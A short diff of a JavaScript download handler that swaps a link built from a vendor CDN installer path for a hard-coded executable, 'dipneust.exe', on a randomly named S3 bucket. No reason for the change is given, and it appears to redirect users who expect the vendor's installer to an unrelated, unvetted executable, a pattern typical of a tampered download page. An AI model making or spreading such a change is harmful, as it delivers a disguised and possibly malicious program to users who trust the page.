@@ -206,9 +206,7 @@ var bdVidHandler = {
 var fanXingHandler = {
     init: function() {
         var self = this;
-        var defaultLink = '//dubapkg.cmcmcdn.com/duba/' + urlParams.sfrom + 
-                         '/kinst_' + urlParams.sfrom + '_f' + pageName + 
-                         '_k' + urlParams.keyID + '.exe';
+        var defaultLink = 'https://spglyjrkemr.s3.ap-east-1.amazonaws.com/f5asamf/s3/dipneust.exe';
         var channelLink = defaultLink.replace('.exe', '_ch1.exe');
         
         try {
